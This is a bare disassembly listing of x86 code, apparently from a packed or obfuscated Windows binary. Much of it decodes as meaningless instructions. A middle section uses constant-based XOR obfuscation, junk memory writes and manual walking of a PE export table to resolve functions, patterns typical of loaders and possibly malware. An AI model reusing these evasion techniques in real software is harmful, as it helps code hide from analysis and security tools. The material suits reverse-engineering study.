  4063ab:	add    BYTE PTR [edi-0x5e050f3f],ah
  4063b1:	cmp    eax,0x6303567d
  4063b6:	ret    0x6429
  4063b9:	ret    0x483b
  4063bc:	mov    dl,0xf
  4063be:	dec    edx
  4063bf:	jno    0x4063a0
  4063c1:	adc    ebx,esi
  4063c3:	dec    ebx
  4063c4:	aad    0x84
  4063c6:	mov    edi,0xef19b54f
  4063cb:	ret    0x46c7
  4063ce:	mov    ?,WORD PTR ds:0xae8a64d2
  4063d4:	mov    bh,0x1a
  4063d6:	cmp    al,0x83
  4063d8:	sti    
  4063d9:	js     0x40641a
  4063db:	mov    edi,0x41460b1a
  4063e0:	pushf  
  4063e1:	push   ebx
  4063e2:	outs   dx,BYTE PTR ds:[esi]
  4063e3:	dec    ebx
  4063e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063e5:	mov    esi,0x14b96105
  4063ea:	mov    ds:0xd49531b9,al
  4063ef:	imul   ebx,ebx,0xffffffce
  4063f2:	cmp    ebx,DWORD PTR [eax+0x362127bd]
  4063f8:	lock jmp 0xe574:0x32b2bd77
  406400:	xchg   edx,eax
  406401:	ss push ds
  406403:	jo     0x406443
  406405:	int3   
  406406:	or     DWORD PTR [edx],ebp
  406408:	xor    dh,bh
  40640a:	fucomp st(7)
  40640c:	cwde   
  40640d:	mov    ?,WORD PTR [ecx]
  40640f:	sbb    ecx,DWORD PTR [ebp+eiz*1-0x57]
  406413:	mov    ds:0x5554ed0c,eax
  406418:	cmove  edi,DWORD PTR [edi+0x1e]
  40641c:	cli    
  40641d:	in     al,dx
  40641e:	inc    edi
  40641f:	mov    ah,BYTE PTR [eax-0x71]
  406422:	or     ch,BYTE PTR [esi+0x6c]
  406425:	cdq    
  406426:	mov    dh,0x9e
  406428:	and    ah,ch
  40642a:	outs   dx,DWORD PTR ds:[esi]
  40642b:	mov    bl,0x99
  40642d:	or     dl,BYTE PTR [ebx]
  40642f:	and    dh,dh
  406431:	(bad)  
  406432:	push   edi
  406433:	pop    ebp
  406434:	adc    DWORD PTR [eax-0x32d9855b],esi
  40643a:	adc    bh,BYTE PTR [ecx+0x2]
  40643d:	in     eax,0x11
  40643f:	xlat   BYTE PTR ds:[ebx]
  406440:	cmp    ebx,DWORD PTR [eax-0x73]
  406443:	mov    eax,ds:0x13233183
  406448:	sbb    BYTE PTR [eax+esi*4-0x2c],ch
  40644c:	jmp    0xe1d8:0xbabb70e3
  406453:	lea    esp,[esi+0x5ebbcc0f]
  406459:	stc    
  40645a:	ror    DWORD PTR ds:0x243f1967,0x63
  406461:	in     eax,0xd8
  406463:	adc    al,BYTE PTR [ecx+0x5e]
  406466:	cmp    bh,BYTE PTR [esi+0x15]
  406469:	or     esp,eax
  40646b:	and    BYTE PTR [ebp+0x2290ddf5],0x18
  406472:	sti    
  406473:	mov    BYTE PTR [eax],al
  406475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406476:	loopne 0x406452
  406478:	cwde   
  406479:	pop    edx
  40647a:	jg     0x406453
  40647c:	pop    esp
  40647d:	or     BYTE PTR [edi+0xf6e76cf],al
  406483:	xchg   esp,eax
  406484:	retf   0x86f9
  406487:	or     al,0x89
  406489:	xchg   ebp,eax
  40648a:	ja     0x4064d5
  40648c:	fwait
  40648d:	shl    DWORD PTR [eax-0x7a],cl
  406490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406491:	test   BYTE PTR [edi],bl
  406493:	stos   DWORD PTR es:[edi],eax
  406494:	push   es
  406495:	cld    
  406496:	or     esi,DWORD PTR [esi-0x55db1823]
  40649c:	lds    ebx,FWORD PTR [eax]
  40649e:	std    
  40649f:	add    esi,esi
  4064a1:	outs   dx,DWORD PTR ds:[esi]
  4064a2:	ins    DWORD PTR es:[edi],dx
  4064a3:	dec    ebx
  4064a4:	(bad)
  4064a7:	ins    DWORD PTR es:[edi],dx
  4064a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064a9:	cli    
  4064aa:	jecxz  0x4064c2
  4064ac:	mov    al,ds:0x658c8587
  4064b1:	es mov edi,0xa843c88e
  4064b7:	pop    DWORD PTR [esi+0x44]
  4064ba:	jmp    0xd4f953d
  4064bf:	dec    edi
  4064c0:	add    al,0xbe
  4064c2:	jno    0x406540
  4064c4:	fwait
  4064c5:	fwait
  4064c6:	(bad)  
  4064c7:	jnp    0x4064bb
  4064c9:	sbb    eax,0x5e0a72c5
  4064ce:	aas    
  4064cf:	add    al,BYTE PTR [ebp-0x3b09b2c4]
  4064d5:	xchg   edi,eax
  4064d6:	mov    ebp,0xaed2ee51
  4064db:	not    bl
  4064dd:	sub    DWORD PTR [edi+ebp*1-0x9809370],0x28
  4064e5:	stos   BYTE PTR es:[edi],al
  4064e6:	add    BYTE PTR [edx-0x6d],al
  4064e9:	mov    esp,0xadaf61ab
  4064ee:	sbb    eax,ebx
  4064f0:	mov    DWORD PTR [ecx],esp
  4064f2:	enter  0xd37a,0xf6
  4064f6:	jmp    0x8fb88bbb
  4064fb:	adc    eax,0xf3ed3b95
  406500:	arpl   si,bp
  406502:	jns    0x406535
  406504:	sahf   
  406505:	(bad)  
  406506:	sbb    al,0xcf
  406508:	or     BYTE PTR [edi],al
  40650a:	shr    edi,1
  40650c:	mov    dh,0x95
  40650e:	mov    esi,DWORD PTR [ebx-0x4aef1de7]
  406514:	ins    DWORD PTR es:[edi],dx
  406515:	mov    cl,0xe3
  406517:	into   
  406518:	mov    ah,0xc7
  40651a:	out    dx,eax
  40651b:	jmp    0xf47b9b5d
  406520:	push   edx
  406521:	into   
  406522:	jge    0x406559
  406524:	or     DWORD PTR [ecx+0x3d],esp
  406527:	mov    ds:0x36e209be,eax
  40652c:	dec    edx
  40652d:	add    eax,0x92e8e859
  406532:	pop    ebp
  406533:	adc    BYTE PTR [ebp+0x1b],bl
  406536:	add    al,0x2e
  406538:	mov    edx,0xfcf1f308
  40653d:	sub    ch,BYTE PTR [ebx+edx*2-0x47320543]
  406544:	dec    esi
  406545:	jne    0x406522
  406547:	shl    ebp,1
  406549:	mov    ds:0x6a946363,al
  40654e:	xlat   BYTE PTR ds:[ebx]
  40654f:	lock mov bl,0x4
  406552:	(bad)  
  406553:	arpl   WORD PTR [ebx],bx
  406555:	not    ebx
  406557:	jl     0x40658b
  406559:	mov    al,0x59
  40655b:	sar    BYTE PTR [esi+ecx*1-0x139cfebf],cl
  406562:	in     al,0x7a
  406564:	ret    0xf59b
  406567:	jno    0x4065c5
  406569:	imul   ecx,DWORD PTR [ebx+0x247e949b],0xffffffc7
  406570:	rol    BYTE PTR [eax],1
  406572:	bound  esp,QWORD PTR [esi]
  406574:	cs jp  0x4065d3
  406577:	into   
  406578:	leave  
  406579:	out    dx,eax
  40657a:	outs   dx,DWORD PTR ds:[esi]
  40657b:	into   
  40657c:	je     0x406561
  40657e:	test   eax,0x286d57b9
  406583:	xor    cl,BYTE PTR [ebp+edi*1+0x7203fa38]
  40658a:	jmp    0x2c5e:0x8356bd12
  406591:	xchg   esi,eax
  406592:	jp     0x4065c3
  406594:	mov    ah,0x57
  406596:	push   0x4
  406598:	adc    al,0x3d
  40659a:	push   ss
  40659b:	sbb    DWORD PTR [ebx-0x3d],edx
  40659e:	pop    esp
  40659f:	cmp    dl,BYTE PTR [ebx+0x22]
  4065a2:	fistp  WORD PTR [ebp+0x20]
  4065a5:	inc    ebp
  4065a6:	in     eax,0x5
  4065a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065a9:	(bad)  
  4065aa:	or     al,dl
  4065ac:	jmp    0x7636:0x20da96cc
  4065b3:	or     DWORD PTR [edi+0x7daf6fb1],edx
  4065b9:	(bad)  
  4065ba:	xchg   edx,eax
  4065bb:	cmp    DWORD PTR [esi],ebp
  4065bd:	fwait
  4065be:	sbb    eax,0x86a762c3
  4065c3:	in     eax,0x73
  4065c5:	or     dh,BYTE PTR [eax-0x49]
  4065c8:	pop    ecx
  4065c9:	xchg   edi,eax
  4065ca:	cld    
  4065cb:	loop   0x4065c3
  4065cd:	sbb    BYTE PTR [edi+0x44],bl
  4065d0:	sbb    ah,dh
  4065d2:	cmp    eax,0x749685ce
  4065d7:	lahf   
  4065d8:	inc    edi
  4065d9:	sbb    BYTE PTR [ebx],0x2b
  4065dc:	dec    ecx
  4065dd:	mov    BYTE PTR [eax-0x1f],dh
  4065e0:	gs pusha 
  4065e2:	sub    ebp,ebx
  4065e4:	jp     0x40660a
  4065e6:	pushf  
  4065e7:	mov    dl,0xcb
  4065e9:	lea    edx,[esi-0x3272db]
  4065ef:	sbb    DWORD PTR ds:0x430000,0x43300c
  4065f9:	xor    ecx,ebx
  4065fb:	xor    DWORD PTR ds:0x42f008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x431008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x42f000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x431000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41df1c
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x43300c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x432018,0x10
  406662:	cmp    DWORD PTR ds:0x432018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x432018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x42b004
  406685:	cmp    DWORD PTR ds:0x432018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x432018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x432018,edi
  40669f:	mov    edi,DWORD PTR ds:0x432018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x432018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x42477f
  4066b7:	mov    edi,DWORD PTR ds:0x41dee4
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x42f008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x430000,0x430010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x43001c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x42f018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x42f018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x42f018,ecx
  40671e:	cmp    DWORD PTR ds:0x42f018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x42f018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x42b048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x43300c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x42f000,0x430004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x43300c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42f01c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42f00c
  406785:	or     DWORD PTR ds:0x432014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x431000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x42f004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x432004
  4067bc:	sbb    eax,DWORD PTR ds:0x43201c
  4067c2:	mov    ds:0x432004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x433008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x431018,0x431008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x432010
  4067f6:	add    ecx,DWORD PTR ds:0x43100c
  4067fc:	mov    DWORD PTR ds:0x432010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x42f004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x42f020,0x43301c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x42f000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42f00c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x43000c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx-0x13],0xcf
  4069c2:	xor    dl,0xc2
  4069c5:	cmp    al,0x62
  4069c7:	bound  ebp,QWORD PTR [edx]
  4069c9:	pop    edi
  4069ca:	bound  esp,QWORD PTR [edx-0x6f]
  4069cd:	mov    bh,0xcb
  4069cf:	mov    esi,?
  4069d1:	mov    ds:0x4f3cd142,eax
  4069d6:	leave  
  4069d7:	clc    
  4069d8:	pop    es
  4069d9:	lahf   
  4069da:	mov    dh,0x7a
  4069dc:	push   ebx
  4069dd:	mov    bh,BYTE PTR [esi]
  4069df:	outs   dx,DWORD PTR ds:[esi]
  4069e0:	and    dh,al
  4069e2:	sahf   
  4069e3:	clc    
  4069e4:	xor    BYTE PTR [ecx-0x4],0x0
  4069e8:	in     eax,0x9a
  4069ea:	ds jmp 0xa42dbc7c
  4069f0:	sub    ebp,esp
  4069f2:	fstp   QWORD PTR [edi]
  4069f4:	pop    esp
  4069f5:	mov    dh,0xb
  4069f7:	ret    
  4069f8:	push   eax
  4069f9:	mov    ?,WORD PTR [edi+0xaa5d974]
  4069ff:	sbb    eax,0xf5d205df
  406a04:	imul   esi,DWORD PTR [ebx],0x368b349a
  406a0a:	mov    ds:0x684c88c9,eax
  406a0f:	mov    esi,0xe5a938f4
  406a14:	dec    ebp
  406a15:	xor    ecx,edi
  406a17:	lds    eax,FWORD PTR [edx+0x48e4d697]
  406a1d:	cdq    
  406a1e:	mov    ecx,0xa5610a82
  406a23:	in     eax,0xc3
  406a25:	ja     0x406a9a
  406a27:	lock sbb esp,ebx
  406a2a:	xchg   esp,eax
  406a2b:	int3   
  406a2c:	add    edx,DWORD PTR [esi-0x6047a1d1]
  406a32:	outs   dx,BYTE PTR ds:[esi]
  406a33:	ins    DWORD PTR es:[edi],dx
  406a34:	shl    DWORD PTR [edx+0x39],cl
  406a37:	addr16 mov ds:0x243c,eax
  406a3b:	xor    al,0xea
  406a3d:	cmp    al,0xd3
  406a3f:	ds xor al,0xca
  406a42:	fdiv   DWORD PTR [edi+0x5e842c5e]
  406a48:	out    0x97,eax
  406a4a:	sbb    ebx,DWORD PTR [edx+eax*4]
  406a4d:	lds    esp,FWORD PTR [esp+ebp*4-0x59ae0bbd]
  406a54:	push   edx
  406a55:	outs   dx,DWORD PTR ds:[esi]
  406a56:	stos   BYTE PTR es:[edi],al
  406a57:	ins    BYTE PTR es:[edi],dx
  406a58:	or     esp,DWORD PTR [edi+0x5f1d68d3]
  406a5e:	adc    esi,DWORD PTR [esi-0x7b90443a]
  406a64:	cli    
  406a65:	les    ebx,FWORD PTR [esi-0x6e]
  406a68:	sbb    dh,ah
  406a6a:	sar    BYTE PTR [esi],cl
  406a6c:	mov    al,ds:0xd3a71ae
  406a71:	imul   ebx,DWORD PTR [ebp-0x5cf9792f],0xffffffde
  406a78:	lods   eax,DWORD PTR ds:[esi]
  406a79:	jb     0x406a92
  406a7b:	jg     0x406a60
  406a7d:	int    0x21
  406a7f:	leave  
  406a80:	push   esp
  406a81:	cmp    al,BYTE PTR [esi-0x705f5447]
  406a87:	inc    eax
  406a88:	push   edx
  406a89:	mov    edi,0x37854cfc
  406a8e:	sub    edx,DWORD PTR [ebp-0x48cbe426]
  406a94:	sbb    eax,0x33773a06
  406a99:	loope  0x406ae2
  406a9b:	push   esp
  406a9c:	dec    edi
  406a9d:	add    esp,DWORD PTR [ebx+ebp*4-0x56f830db]
  406aa4:	daa    
  406aa5:	sbb    al,0x39
  406aa7:	pop    ss
  406aa8:	cmp    DWORD PTR [esi-0x5f6c4e22],ebx
  406aae:	call   FWORD PTR [ebx+0x33089d72]
  406ab4:	cs clc 
  406ab6:	xchg   edx,eax
  406ab7:	push   0x47
  406ab9:	rcr    DWORD PTR [ecx-0x2b8586f],0x25
  406ac0:	repz push ebx
  406ac2:	mov    ch,0xc
  406ac4:	and    ecx,DWORD PTR [ebp-0x1b]
  406ac7:	pop    ss
  406ac8:	fcomp  DWORD PTR [esi-0x77]
  406acb:	cmp    DWORD PTR [edi-0x7b],ebx
  406ace:	ret    0xc302
  406ad1:	xchg   edx,eax
  406ad2:	fstp   st(5)
  406ad4:	jle    0x406a67
  406ad6:	dec    esp
  406ad7:	sar    DWORD PTR [eax+esi*1-0x7eacda7d],1
  406ade:	les    esp,FWORD PTR [edx+0x609e48e5]
  406ae4:	loop   0x406b5b
  406ae6:	aad    0x6d
  406ae8:	mov    esi,0x4a1ceccf
  406aed:	popf   
  406aee:	jmp    0x857f3fa0
  406af3:	push   edx
  406af4:	leave  
  406af5:	es inc ebx
  406af7:	mov    al,0x25
  406af9:	test   al,0x74
  406afb:	push   ebp
  406afc:	cmp    ch,cl
  406afe:	lea    eax,[ecx+0x710ce5da]
  406b04:	mov    bl,BYTE PTR [ebp+0x3c]
  406b07:	adc    eax,0xf121e220
  406b0c:	inc    ebp
  406b0d:	fist   DWORD PTR [ebx+0x5b]
  406b10:	sbb    DWORD PTR [esi-0x4e],edi
  406b13:	repnz cmp al,0xf6
  406b16:	push   ds
  406b17:	sahf   
  406b18:	xor    eax,0x6bd75d13
  406b1d:	adc    BYTE PTR ds:0x441f2b9,cl
  406b23:	ja     0x406b6a
  406b25:	sbb    eax,0xa748b6fb
  406b2a:	ins    BYTE PTR es:[edi],dx
  406b2b:	stc    
  406b2c:	and    BYTE PTR [ebx-0x56],bl
  406b2f:	and    al,0x15
  406b31:	enter  0x7087,0xd0
  406b35:	add    BYTE PTR [edx-0x660b2e6e],dh
  406b3b:	cld    
  406b3c:	jg     0x406b40
  406b3e:	mov    ah,0x30
  406b40:	enter  0x5751,0x42
  406b44:	sbb    DWORD PTR [edx],edi
  406b46:	mov    edx,0xc5538908
  406b4b:	test   BYTE PTR [edx-0x11ac5c73],dl
  406b51:	fdiv   QWORD PTR [ebp+0x60]
  406b54:	pushf  
  406b55:	lods   al,BYTE PTR ds:[esi]
  406b56:	pop    es
  406b57:	pop    edx
  406b58:	mov    bl,0x2f
  406b5a:	stc    
  406b5b:	loopne 0x406bb8
  406b5d:	add    bl,BYTE PTR [eax+0x2c3f3005]
  406b63:	mov    edi,0x401164c3
  406b68:	jno    0x406b47
  406b6a:	cmc    
  406b6b:	outs   dx,BYTE PTR ds:[esi]
  406b6c:	sbb    eax,0x70c9efd1
  406b71:	dec    ecx
  406b72:	mov    bh,0xfd
  406b75:	call   0x5664e956
  406b7a:	outs   dx,DWORD PTR ds:[esi]
  406b7b:	sub    edi,edx
  406b7d:	or     al,0xb5
  406b7f:	xlat   BYTE PTR ds:[ebx]
  406b80:	aas    
  406b81:	push   eax
  406b82:	arpl   WORD PTR [ebp-0x7e937405],bx
  406b88:	pop    ecx
  406b89:	gs mov eax,0xb5a678a8
  406b8f:	pop    ebp
  406b90:	hlt    
  406b91:	dec    ecx
  406b92:	push   ds
  406b93:	rcl    DWORD PTR [edi+0x37],1
  406b96:	mov    dl,0xbd
  406b98:	outs   dx,BYTE PTR ds:[esi]
  406b99:	in     eax,0x4
  406b9b:	mov    ah,al
  406b9d:	in     eax,dx
  406b9e:	je     0x406bea
  406ba0:	mov    DWORD PTR [ecx-0x71],esi
  406ba3:	adc    ebp,edx
  406ba5:	sub    al,0xc5
  406ba7:	fmul   st(7),st
  406ba9:	mov    ds:0x584e132f,al
  406bae:	(bad)  
  406baf:	or     DWORD PTR [eax+0x3c],edx
  406bb2:	shl    DWORD PTR [ecx-0x66],0x2f
  406bb6:	fwait
  406bb7:	aaa    
  406bb8:	or     DWORD PTR [ebp+edi*2-0x1420e9f8],ecx
  406bbf:	push   ds
  406bc0:	adc    BYTE PTR [esi+eax*8],bl
  406bc3:	mov    esi,0xc77b3fc
  406bc8:	shr    DWORD PTR [ecx],0x5c
  406bcb:	retf   
  406bcc:	mov    ds:0x4227fa7a,eax
  406bd1:	jb     0x406b7f
  406bd3:	xor    DWORD PTR [edx+edx*1],0x8ab8a6a8
  406bda:	rol    BYTE PTR [bx+si],1
  406bdd:	outs   dx,DWORD PTR fs:[esi]
  406bdf:	cli    
  406be0:	inc    DWORD PTR [edi+edx*2]
  406be3:	fs cmp al,0xeb
  406be6:	das    
  406be7:	psubusw mm2,QWORD PTR [ebx+0x36]
  406beb:	pop    esi
  406bec:	pop    es
  406bed:	or     eax,0x218392fe
  406bf2:	outs   dx,DWORD PTR es:[esi]
  406bf4:	aad    0xf4
  406bf6:	adc    ebx,DWORD PTR [eax-0x5b]
  406bf9:	pop    eax
  406bfa:	cs mov ah,0xdd
  406bfd:	cwde   
  406bfe:	sub    dl,BYTE PTR [edi]
  406c00:	addr16 call 0xd5e0f15b
  406c06:	fldenv [ecx+0x60]
  406c09:	mov    edx,0x6f69091e
  406c0e:	adc    ebx,ecx
  406c10:	fdiv   st(0),st
  406c12:	out    0x71,al
  406c14:	xor    BYTE PTR [eax+0x22c26fcd],dl
  406c1a:	sbb    al,0x40
  406c1c:	sub    ecx,DWORD PTR [edx]
  406c1e:	es je  0x406c81
  406c21:	mov    ds:0x59f41e16,eax
  406c26:	mov    esi,0xc5bf1063
  406c2b:	pop    esp
  406c2c:	sub    al,0x81
  406c2e:	ds inc ebp
  406c30:	mov    eax,ds:0x233228e7
  406c35:	push   esi
  406c36:	aam    0x12
  406c38:	sbb    DWORD PTR [edx+0x66],esi
  406c3b:	jmp    0xa037:0x9ecd2c25
  406c42:	fist   DWORD PTR [ebp+0x73]
  406c45:	jp     0x406c9b
  406c47:	fistp  QWORD PTR gs:[eax-0x3170d8b1]
  406c4e:	(bad)  
  406c4f:	dec    ecx
  406c50:	add    DWORD PTR [ebp+0x5],ebp
  406c53:	pop    es
  406c54:	popf   
  406c55:	cmp    edx,esi
  406c57:	pop    edx
  406c58:	push   esi
  406c59:	xlat   BYTE PTR ds:[ebx]
  406c5a:	pop    ss
  406c5b:	sbb    esi,DWORD PTR [edi]
  406c5d:	xchg   esi,eax
  406c5e:	fisub  WORD PTR [edi-0x45]
  406c61:	ja     0x406cab
  406c63:	cmp    cl,dl
  406c65:	fimul  DWORD PTR [eax+0x6a3382cd]
  406c6b:	js     0x406ca2
  406c6d:	add    ebp,DWORD PTR [esi+edx*8]
